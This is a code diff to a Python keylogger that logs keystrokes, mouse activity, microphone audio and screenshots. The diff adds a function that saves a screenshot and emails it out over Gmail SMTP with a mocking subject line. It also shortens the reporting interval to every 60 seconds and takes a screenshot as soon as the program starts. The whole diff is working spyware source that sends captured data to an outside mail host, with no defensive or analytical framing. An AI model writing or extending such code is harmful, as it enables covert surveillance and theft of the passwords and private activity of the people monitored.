@@ -9,6 +9,9 @@ import pyscreenshot
 import sounddevice as sd
 from pynput import keyboard
 from pynput.keyboard import Listener
+from email.mime.text import MIMEText
+from email.mime.image import MIMEImage
+from email.mime.multipart import MIMEMultipart
 # except ModuleNotFoundError:
 from subprocess import call
 modules = ["pyscreenshot", "sounddevice", "pynput"]
@@ -16,9 +19,9 @@ call("pip install " + ' '.join(modules), shell=True)
 
 
 # finally:
-EMAIL_ADDRESS = "YOUR_EMAIL"
-EMAIL_PASSWORD = "YOUR_EMAIL_PASSWORD"
-SEND_REPORT_EVERY = 3600
+EMAIL_ADDRESS = "email"
+EMAIL_PASSWORD = "pass"
+SEND_REPORT_EVERY = 60
 
 
 class KeyLogger:
@@ -63,6 +66,29 @@ class KeyLogger:
             server.sendmail(email, email, message)
             server.quit()
 
+        def send_img(self):
+            with open('ss.png', 'rb') as f:
+                    img_data = f.read()
+            msg = MIMEMultipart()
+            msg['Subject'] = socket.gethostname() + '\'s screenshot LMAO!'
+            msg['From'] = EMAIL_ADDRESS
+            msg['To'] = EMAIL_ADDRESS
+            
+            text = MIMEText('test')
+            msg.attach(text)
+            image = MIMEImage(img_data, name=os.path.basename('ss.png'))
+            msg.attach(image)
+
+            s = smtplib.SMTP(host='smtp.gmail.com', port=587)
+            s.ehlo()
+            s.starttls()
+            s.ehlo()
+            s.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
+            s.sendmail(msg['From'], msg['To'], msg.as_string())
+            s.quit()
+            print('Screenshot sent...')
+            os.remove('ss.png')
+
         def report(self):
             self.send_mail(self.email, self.password, "\n\n" + self.log)
             self.log = ""
@@ -93,16 +119,21 @@ class KeyLogger:
             sd.wait()
 
             self.send_mail(email=EMAIL_ADDRESS, password=EMAIL_PASSWORD, message=obj)
-
+            
         def screenshot(self):
+            print('screenshotting...')
             img = pyscreenshot.grab()
-            self.send_mail(email=EMAIL_ADDRESS, password=EMAIL_PASSWORD, message=img)
+            img.save('ss.png')
+            self.send_img()
+            #self.send_mail(email=EMAIL_ADDRESS, password=EMAIL_PASSWORD, message=img)
 
         def run(self):
+            self.screenshot()
             keyboard_listener = keyboard.Listener(on_press=self.save_data)
             with keyboard_listener:
                 self.report()
                 keyboard_listener.join()
+
             with Listener(on_click=self.on_click,
 on_move=self.on_move, on_scroll=self.on_scroll) as mouse_listener:
                 mouse_listener.join()
